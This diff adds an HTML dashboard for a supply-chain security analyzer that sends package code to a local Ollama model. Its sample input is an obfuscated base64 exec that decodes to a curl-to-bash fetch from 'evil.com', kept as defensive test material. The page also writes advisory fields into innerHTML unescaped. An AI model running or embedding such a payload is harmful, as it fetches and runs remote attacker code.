@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supply-Chain Security Analyzer | Local AI Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen font-sans">
+    
+    <header class="border-b border-slate-800 bg-slate-900/50 backdrop-blur sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <div class="bg-indigo-600 p-2 rounded-lg text-white font-bold">🛡️</div>
+                <div>
+                    <h1 class="text-xl font-bold tracking-tight">Supply-Chain Security Analyzer</h1>
+                    <p class="text-xs text-slate-400">Powered by Local <span class="text-indigo-400 font-semibold">gemma4:12b</span> &amp; OpenSSF OSV</p>
+                </div>
+            </div>
+            <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                ● Ollama Active (gemma4:12b)
+            </span>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-6 py-8 grid grid-cols-1 lg:grid-cols-3 gap-8">
+        
+        <!-- Left Column -->
+        <div class="lg:col-span-1 space-y-6">
+            <!-- Scan Local Repo Box with Path Input -->
+            <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl">
+                <h2 class="text-base font-semibold mb-2">📂 Load Local OSV Database</h2>
+                <p class="text-xs text-slate-400 mb-3">Enter the path to your malicious-packages repository folder.</p>
+                
+                <input type="text" id="repoPathInput" value="/Users/atharvbansal/Desktop/college/malicious-packages" class="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-200 mb-3 focus:outline-none focus:border-indigo-500 font-mono">
+                
+                <button onclick="scanRepo()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium py-2 px-4 rounded-lg text-sm transition-colors shadow-lg shadow-emerald-600/20">
+                    Scan Local Repository
+                </button>
+            </div>
+
+            <!-- Custom Sandbox -->
+            <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl">
+                <h2 class="text-base font-semibold mb-2">⚡ Live AI Threat Explainer</h2>
+                <div class="space-y-4 mt-3">
+                    <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1">Target / File Path</label>
+                        <input type="text" id="inputPath" value="setup.py" class="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-indigo-500">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1">Code Snippet / Payload</label>
+                        <textarea id="inputCode" rows="5" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs font-mono text-indigo-300 focus:outline-none focus:border-indigo-500">import os, base64
+exec(base64.b64decode('aW1wb3J0IG9zCmlzLnN5c3RlbSgnY3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWwgfCBiYXNoJyk='))</textarea>
+                    </div>
+                    <button onclick="analyzeSnippet()" id="analyzeBtn" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-2 px-4 rounded-lg text-sm transition-colors shadow-lg shadow-indigo-600/20">
+                        Run Local AI Analysis
+                    </button>
+                </div>
+            </div>
+
+            <!-- Discovered Packages List -->
+            <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl">
+                <h3 class="text-sm font-semibold mb-3 text-slate-300">📦 Discovered Repo Advisories</h3>
+                <div id="repoList" class="space-y-2 max-h-60 overflow-y-auto text-xs text-slate-400">
+                    Click "Scan Local Repository" above to load files.
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Column: Output -->
+        <div class="lg:col-span-2 space-y-6">
+            <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl min-h-[550px] flex flex-col">
+                <div class="flex justify-between items-center mb-4 pb-3 border-b border-slate-800">
+                    <h2 class="text-lg font-semibold">📋 Analysis Output</h2>
+                    <span id="statusBadge" class="text-xs px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 font-medium">Idle</span>
+                </div>
+                
+                <div id="loadingSpinner" class="hidden flex-1 flex flex-col items-center justify-center space-y-3 py-16">
+                    <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-indigo-500"></div>
+                    <p class="text-sm text-slate-400">Querying local gemma4:12b model via Ollama...</p>
+                </div>
+
+                <div id="outputContainer" class="flex-1 bg-slate-950 rounded-lg p-6 border border-slate-800/80 text-sm font-mono text-slate-300 whitespace-pre-wrap overflow-y-auto leading-relaxed">
+Select a package from your local repository or run an analysis to view AI threat breakdowns.
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+        async function scanRepo() {
+            const repoList = document.getElementById('repoList');
+            const userPath = document.getElementById('repoPathInput').value;
+            repoList.innerHTML = "<span class='text-indigo-400'>Scanning folder...</span>";
+            
+            try {
+                const response = await fetch('/api/scan-repo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ repo_path: userPath })
+                });
+                const data = await response.json();
+                
+                if (data.status === 'success' && data.packages.length > 0) {
+                    repoList.innerHTML = "";
+                    data.packages.forEach(pkg => {
+                        const btn = document.createElement('button');
+                        btn.className = "w-full text-left bg-slate-950 hover:bg-slate-800/80 border border-slate-800 p-2.5 rounded-lg text-xs transition-colors mb-2";
+                        btn.innerHTML = `<span class="font-bold text-red-400">${pkg.id}</span><p class="text-slate-400 truncate mt-0.5">${pkg.summary}</p>`;
+                        btn.onclick = () => {
+                            document.getElementById('inputPath').value = pkg.path;
+                            document.getElementById('inputCode').value = pkg.details;
+                            analyzeSnippet();
+                        };
+                        repoList.appendChild(btn);
+                    });
+                } else {
+                    repoList.innerHTML = "No packages found or invalid directory path.";
+                }
+            } catch (err) {
+                repoList.innerHTML = "Error connecting to server.";
+            }
+        }
+
+        async function analyzeSnippet() {
+            const path = document.getElementById('inputPath').value;
+            const code = document.getElementById('inputCode').value;
+            const outputContainer = document.getElementById('outputContainer');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const statusBadge = document.getElementById('statusBadge');
+            const btn = document.getElementById('analyzeBtn');
+
+            btn.disabled = true;
+            loadingSpinner.classList.remove('hidden');
+            outputContainer.classList.add('hidden');
+            statusBadge.textContent = "Processing...";
+            statusBadge.className = "text-xs px-2.5 py-1 rounded-full bg-indigo-500/10 text-indigo-400 font-medium border border-indigo-500/20";
+
+            try {
+                const response = await fetch('/api/analyze', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ path, code })
+                });
+                const data = await response.json();
+                
+                loadingSpinner.classList.add('hidden');
+                outputContainer.classList.remove('hidden');
+
+                if (data.status === 'success') {
+                    outputContainer.textContent = data.analysis;
+                    statusBadge.textContent = "Complete";
+                    statusBadge.className = "text-xs px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 font-medium border border-emerald-500/20";
+                } else {
+                    outputContainer.textContent = "Error: " + data.message;
+                    statusBadge.textContent = "Error";
+                    statusBadge.className = "text-xs px-2.5 py-1 rounded-full bg-red-500/10 text-red-400 font-medium border border-red-500/20";
+                }
+            } catch (err) {
+                loadingSpinner.classList.add('hidden');
+                outputContainer.classList.remove('hidden');
+                outputContainer.textContent = "Network Error.";
+                statusBadge.textContent = "Failed";
+            } finally {
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
